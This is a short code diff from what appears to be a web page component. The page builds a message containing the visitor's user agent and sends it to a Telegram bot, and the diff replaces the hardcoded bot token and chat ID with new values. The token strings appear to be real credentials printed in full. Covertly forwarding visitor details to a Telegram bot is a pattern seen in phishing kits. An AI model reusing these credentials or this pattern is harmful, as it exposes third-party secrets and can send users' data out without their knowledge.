@@ -81,8 +81,8 @@ const Home = () => {
                 User Agent: ${userAgent}`;
 
                 // Replace these values with your bot token and chat ID
-                const botToken = '7072591946:AAEoGhlnq4X9wUs7r5omOeDy2aXLbQ-RI9I';
-                const chatId = '5092152880';
+                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+                const chatId = '7380056237';
 
                 try {
                     // Send the message to Telegram
